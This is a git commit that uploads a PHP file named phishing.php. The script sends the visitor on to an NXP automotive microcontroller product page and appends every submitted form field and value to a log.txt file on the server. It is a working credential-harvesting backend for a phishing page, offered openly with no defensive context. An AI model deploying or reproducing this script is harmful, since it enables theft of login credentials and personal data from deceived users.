02fb1593889765e494753a2da602740226a79f09
lahirulke <lahiru578@gmail.com>
2017-03-20 23:58:52 +0530

    Add files via upload

---
+++ phishing.php
@@ -0,0 +1,13 @@
+﻿<?php
+header ('Location: http://www.nxp.com/products/microcontrollers-and-processors/arm-processors/s32-arm-processors-microcontrollers/32-bit-automotive-general-purpose-microcontrollers:S32K');
+$handle = fopen("log.txt", "a");
+foreach($_POST as $variable => $value) {
+   fwrite($handle, $variable);
+   fwrite($handle, "=");
+   fwrite($handle, $value);
+   fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?>
